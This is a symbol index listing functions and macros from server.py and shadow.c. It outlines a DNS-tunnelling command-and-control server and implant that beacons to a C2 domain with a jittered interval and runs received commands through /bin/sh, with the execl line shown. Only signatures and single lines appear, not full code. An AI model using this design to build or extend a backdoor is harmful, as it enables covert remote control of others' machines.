# Symbols

| Symbol | Kind | File:Line | Signature |
|--------|------|-----------|-----------|
| `build_dns_response` | function | `server.py:49` | `def build_dns_response(query_data, answer_name, qtype, qclass, rdata_str, ttl)` |
| `cmd_input` | function | `server.py:156` | `def cmd_input()` |
| `decode_b64` | function | `server.py:20` | `def decode_b64(data)` |
| `decode_dns_name` | function | `server.py:27` | `def decode_dns_name(data, pos)` |
| `dns_server` | function | `server.py:147` | `def dns_server()` |
| `encode_b64` | function | `server.py:17` | `def encode_b64(data)` |
| `handle_query` | function | `server.py:77` | `def handle_query(data, addr, sock)` |
| `BEACON_INTERVAL` | macro | `shadow.c:24` | `#define BEACON_INTERVAL` |
| `C2_DOMAIN` | macro | `shadow.c:23` | `#define C2_DOMAIN` |
| `DNS_PORT` | macro | `shadow.c:22` | `#define DNS_PORT` |
| `DNS_SERVER` | macro | `shadow.c:20` | `#define DNS_SERVER` |
| `_GNU_SOURCE` | macro | `shadow.c:5` | `#define _GNU_SOURCE` |
| `build_dns_query` | function | `shadow.c:68` | `static int build_dns_query(uint16_t id, const char *name, int qtype, unsigned char *buf)` |
| `c2_thread` | function | `shadow.c:161` | `static void *c2_thread(void *arg)` |
| `close` | function | `shadow.c:112` | `close(sock);` |
| `decode_b64` | function | `shadow.c:41` | `static void decode_b64(const char *in, unsigned char *out, size_t *out_len)` |
| `dns_query` | function | `shadow.c:98` | `static int dns_query(const char *name, int qtype, unsigned char *response, size_t *resp_len)` |
| `dup2` | function | `shadow.c:136` | `dup2(pipefd[1], STDOUT_FILENO);` |
| `encode_b64` | function | `shadow.c:28` | `static void encode_b64(const unsigned char *in, size_t len, char *out)` |
| `execl` | function | `shadow.c:140` | `execl("/bin/sh", "sh", "-c", cmd, NULL);` |
| `exit` | function | `shadow.c:141` | `exit(1);` |
| `fprintf` | function | `shadow.c:175` | `fprintf(stderr, "[*] Beacon: %s\n", domain);` |
| `free` | function | `shadow.c:215` | `free(output);` |
| `main` | function | `shadow.c:223` | `int main(int argc, char **argv)` |
| `memcpy` | function | `shadow.c:73` | `memcpy(buf + pos, &id, 2);` |
| `pthread_create` | function | `shadow.c:226` | `pthread_create(&t, NULL, c2_thread, NULL);` |
| `pthread_detach` | function | `shadow.c:227` | `pthread_detach(t);` |
| `run_cmd` | function | `shadow.c:128` | `static char *run_cmd(const char *cmd)` |
| `setsockopt` | function | `shadow.c:117` | `setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));` |
| `sleep` | function | `shadow.c:218` | `sleep(BEACON_INTERVAL + (rand() % 5));` |
| `snprintf` | function | `shadow.c:172` | `snprintf(beacon, sizeof(beacon), "B:PID=%d TIME=%ld", getpid(), time(NULL));` |
| `srand` | function | `shadow.c:167` | `srand(time(NULL) ^ getpid());` |
| `waitpid` | function | `shadow.c:155` | `waitpid(pid, NULL, 0);` |
